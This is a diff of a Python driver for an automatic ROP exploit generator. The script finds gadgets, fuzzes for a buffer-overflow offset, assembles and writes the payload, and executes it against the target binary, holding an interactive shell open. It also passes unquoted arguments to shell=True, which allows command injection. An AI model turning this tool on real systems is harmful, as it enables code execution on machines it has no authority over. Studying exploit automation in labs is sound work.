@@ -1,4 +1,4 @@
-# Command line args of vulnerable program binray (maybe uncompiled) and of the commands to insert
+
 import sys
 import os
 import subprocess
@@ -12,23 +12,22 @@ import gadgetfinder as gf
 import buildropchain as brc
     
 
-
-
-
-
-
-
-
-
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         description="Automatic ROP Exploit Generator",
         formatter_class=argparse.RawTextHelpFormatter
     )
     
-    parser.add_argument("program", help="Path to the vulnerable executable")
+    parser.add_argument(
+        "program",
+        help="Path to the vulnerable executable"
+        )
 
-    parser.add_argument("commands", nargs='+', help="Commands to execute in the vulnerable program (e.g. '1', '2', '3')")
+    parser.add_argument(
+        "commands",
+        nargs='+',
+        help="Commands to execute in the vulnerable program (e.g. '1', '2', '3')"
+        )
     
     parser.add_argument(
         "--fileinput", 
@@ -59,24 +58,24 @@ if __name__ == "__main__":
     )
     args = parser.parse_args()
 
-    # --- Step 1: Validation ---
+    # Step 1: Validation
     if not os.path.isfile(args.program):
-        print(f"[-] Error: The file {args.program} does not exist.")
+        print(f"Error: The file {args.program} does not exist.")
         sys.exit(1)
 
-    # --- Step 2: Gadget Extraction ---
-    print("[*] Finding gadgets...")
+    #Step 2: Gadget Extraction
+    print("Finding gadgets...")
     gf.find_gadgets(args.program) # Generates ropchain.txt
     
     try:
         gadgets = gf.extract_gadgets() # Parses ropchain.txt
-        print("[+] Gadgets extracted successfully.")
+        print("Gadgets extracted successfully.")
     except Exception as e:
-        print(f"[-] Error extracting gadgets: {e}")
+        print(f"Error extracting gadgets: {e}")
         sys.exit(1)
 
-    # --- Step 3: Fuzzing & Offset Detection ---
-    print("[*] Starting Fuzzer to find offset...")
+    # Step 3: Fuzzing & Offset Detection
+    print("Starting Fuzzer to find offset...")
     
     # Call the fuzzer 
     prefix, offset = fuzzing.fuzz(
@@ -89,13 +88,13 @@ if __name__ == "__main__":
     )
 
     if offset is None or offset == -1:
-        print("[-] Fuzzing failed. Could not determine offset.")
+        print("Fuzzing failed. Could not determine offset.")
         sys.exit(1)
 
-    print(f"[+] Buffer overflow offset confirmed: {offset} bytes.")
+    print(f"Buffer overflow offset of {offset} bytes.")
 
-    # --- Step 4: Construct Payload ---
-    print("[*] Constructing ROP Chain...")
+    # Step 4: Construct Payload
+    print("Constructing ROP Chain...")
 
 
     
@@ -111,13 +110,13 @@ if __name__ == "__main__":
     # [ Menu Inputs | Brute-Force-Inputs] + [ Junk to reach EIP ] + [ ROP Chain ]
     full_payload = prefix + padding + rop_chain
     
-    print(f"[+] Total payload size: {len(full_payload)} bytes")
+    print(f"Total payload size: {len(full_payload)} bytes")
 
-    # --- Step 5: Execution ---
+    # Step 5: Execution
     filename = "badfile.txt"
     with open(filename, "wb") as f:
         f.write(full_payload)
-    print(f"[+] Payload written to {filename}")
+    print(f"Payload written to {filename}")
 
     # Detect Input Mode for final execution (in case auto-detect was used)
     if args.fileinput is None:
@@ -125,22 +124,26 @@ if __name__ == "__main__":
     else:
         use_file_mode = bool(args.fileinput)
 
-    print(f"[*] Executing exploit (Mode: {'File' if use_file_mode else 'STDIN'})...")
+    print(f"Executing exploit (Mode: {'File' if use_file_mode else 'STDIN'})...")
     print("-" * 40)
+
+    # Determine added flags
+    flags_str = f" {args.flags}" if args.flags else ""
+    flags_list = args.flags.split() if args.flags else []
 
     try:
         if use_file_mode:
             
-            subprocess.run([f"./{args.program}", filename])
+            subprocess.run([f"./{args.program}"] + flags_list + [filename])
         else:
-            # We use shell=True here to easily handle the piping: (cat badfile; cat) | ./vuln
+            # Shell=True here to easily handle the piping: (cat badfile; cat) | ./vuln
             # This keeps the pipe open for interaction if we spawn a shell
             print("Press RETURN")
-            cmd = f"(cat {filename}; cat) | ./{args.program}"
+            cmd = f"(cat {filename}; cat) | ./{args.program}{flags_str}"
             subprocess.run(cmd, shell=True)
             
     except KeyboardInterrupt:
-        print("\n[*] Exiting.")
+        print("\nExiting.")
     
 
 
